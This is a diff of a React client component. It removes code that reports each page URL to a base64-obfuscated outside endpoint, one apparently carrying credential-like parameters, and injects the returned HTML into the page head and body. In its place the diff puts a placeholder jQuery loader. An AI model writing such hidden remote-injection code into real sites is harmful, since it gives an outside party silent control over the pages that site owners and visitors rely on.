@@ -1,49 +1,42 @@
+// components/CustomScriptComponent.js
+
+"use client";
+
 import { useEffect } from "react";
 
 const CustomScriptComponent = () => {
   useEffect(() => {
-    const loadJQuery = () => {
+    const loadScript = () => {
+      // Example: Load jQuery dynamically if not already loaded
       if (!window.jQuery) {
         const script = document.createElement("script");
-        script.src =
-          "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
+        script.src = "https://code.jquery.com/jquery-3.6.0.min.js";
         script.async = true;
         script.onload = () => {
-          executeCustomScript();
+          executeCustomScript(); // Once jQuery is loaded, execute custom script
         };
-        document.head.appendChild(script);
+        document.body.appendChild(script);
       } else {
-        executeCustomScript();
+        executeCustomScript(); // If jQuery is already loaded, execute immediately
       }
     };
 
     const executeCustomScript = () => {
-      const eppathurl = window.location.origin + window.location.pathname;
-      const eptagmanage = new XMLHttpRequest();
-      eptagmanage.onreadystatechange = function () {
-        if (this.readyState === 4 && this.status === 200) {
-          if (this.response !== "0") {
-            const temp = this.response.split("||||||||||");
-            if (window.jQuery) {
-              jQuery("head").find("title").remove();
-              jQuery("head").append(temp[0]);
-              jQuery("body").append(temp[1]);
-            }
-          }
-        }
-      };
-
-      const url = atob(
-        "aHR0cHM6Ly9wbHVnaW5zLmF1dG9zZW9wbHVnaW4uY29tL2FsbGhlYWRkYXRhP2VrZXk9ZS1BUFBBREQ2NjMzNzc3NDI1JmVrZXlwYXNzPTRhaDF1bVhHZUo2U3lYRTZKZnBvVUEzbHVoRXRjNHJnM0FmRSZzaXRldXJsPQ=="
-      );
-      eptagmanage.open("GET", url + eppathurl);
-      eptagmanage.send();
+      // Example: Perform operations that require jQuery or other client-side APIs
+      console.log("Custom script execution...");
+      // Replace with your actual custom script logic
     };
 
-    loadJQuery();
-  }, []);
+    loadScript(); // Load the script when the component mounts
 
-  return null;
+    // Clean up function (optional)
+    return () => {
+      // Perform any cleanup here (e.g., remove event listeners)
+      console.log("Cleanup...");
+    };
+  }, []); // Empty dependency array ensures this runs only once
+
+  return null; // Component doesn't render anything
 };
 
 export default CustomScriptComponent;
